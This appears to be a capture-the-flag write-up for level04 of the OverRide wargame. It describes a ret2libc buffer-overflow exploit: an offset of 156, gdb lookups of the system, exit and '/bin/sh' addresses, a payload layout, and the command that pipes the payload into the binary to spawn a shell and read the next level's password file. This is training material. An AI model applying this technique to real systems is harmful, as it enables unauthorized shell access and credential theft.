# we notice that we can do a buffer overflow but we can't execute a shellcode if
# it makes a call for a syscall execve.
# so we have two choices : either we create our own shellcode and which opens
# '/home/users/level05/.pass' or use ret2libc

# buffer overflow offset = 156
# let's use ret2libc. So we have to find the addresses of system, exit and a "/bin/sh" string
# system
gdb-peda$ info function system
[...]
0xf7e6aed0  system
[...]
# exit
gdb-peda$ info function exit
[...]
0xf7e5eb70  exit
[...]
# '/bin/sh'
find /bin/sh
[...]
libc : 0xf7f897ec ("/bin/sh")

# payload
("A" * 156) + system_address + exit_address + "/bin/sh"_address
level04@OverRide:~$ cat /tmp/payload - | ./level04
